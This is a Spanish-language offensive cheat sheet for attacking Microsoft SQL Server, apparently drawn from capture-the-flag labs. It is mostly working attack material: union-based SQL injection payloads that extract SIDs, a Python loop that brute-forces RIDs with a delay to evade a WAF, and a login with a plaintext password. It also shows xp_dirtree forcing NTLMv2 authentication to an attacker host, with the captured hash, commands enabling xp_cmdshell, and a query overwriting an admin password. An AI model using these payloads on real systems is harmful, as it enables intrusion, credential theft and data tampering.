# MSSQL - 1433

## Obtener suma RID + SID

```
-> test' union select 1,SUSER_SID('MEGACORP\Administrator'),3,4,5-- -
[
     {
          "id": 1,
          "name": "\u0001\u0005\u0000\u0000\u0000\u0000\u0000\u0005\u0015\u0000\u0000\u0000\u001c\u0000\u00d1\u00bc\u00d1\u0081\u00f1I+\u00df\u00c26\u00f4\u0001\u0000\u0000",
          "position": "3",
          "email": "4",
          "src": "5"
     }
```

### Para representarla en hexadecimal

```
-> test' union select 1,sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator')),3,4,5-- -
[
     {
          "id": 1,
          "name": "0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000",
          "position": "3",
          "email": "4",
          "src": "5"
     }
```

Toda la cadena, sin contar con el ‘0x’, tiene un total de 56 caracteres, de los cuales los 48 primeros corresponden al RID y el resto al SID

```
echo -n "0105000000000005150000001c00d1bcd181f1492bdfc236f4010000" | wc -c
56
```

```
echo -n "0105000000000005150000001c00d1bcd181f1492bdfc236f4010000" | tail -c 8
f4010000
```

```
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x01f4
500
```

### Ejemplo fuerza bruta RIDs

```python
if __name__ == '__main__':    for num in range(500, 550): # Mediante un bucle infinito, solicito el input que quiero transformar        RID = bruteforceRID(num)        sqli = "test' union select 1,SUSER_SNAME(%s%s),3,4,5-- -" % (SID, RID)        sqli = sqli.strip()        formatunicode(sqli)        sqli_formated = formatunicode(sqli)        toprint = makeRequest(sqli_formated)        makeRequest(sqli_formated)        print(toprint)        time.sleep(1) # Necesario para que no bloquee el WAF
```

## Obtención de usuario a partir de RID + SID

```
test' union select 1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),3,4,5-- -
```

## Conexión inicial

```
mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
[!] Press help for extra shell commands
SQL>
```

## Obtener Hash NetNTLMv2

```
SQL> xp_dirtree "\\10.10.16.4\leak"
```

```
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:a5748bb6a868404a:7596706CC1326FCEC30FD0DB454D224E:010100000000000000D2614B2742D901768B46A3741861B60000000002000800350052004C00330001001E00570049004E002D0044004900530033005200330031004C004E004200440004003400570049004E002D0044004900530033005200330031004C004E00420044002E00350052004C0033002E004C004F00430041004C0003001400350052004C0033002E004C004F00430041004C0005001400350052004C0033002E004C004F00430041004C000700080000D2614B2742D90106000400020000000800300030000000000000000000000000300000358F748AA91A7613A11E7582AEF0BC7726B2151CE1DE991E2C3950E61659C30C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003400000000000000000000000000
```

## Ejecutar comandos a nivel de sistema

```
xp_cmdshell "whoami"; SP_CONFIGURE "show advanced options", 1; RECONFIGURE; SP_CONFIGURE "xp_cmdshell", 1; RECONFIGURE
```

## Modificar datos

```jsx
update users set password = 'c6c35ae1f3cb19438e0199cfa72a9d9d' where name = "Server Admin";
```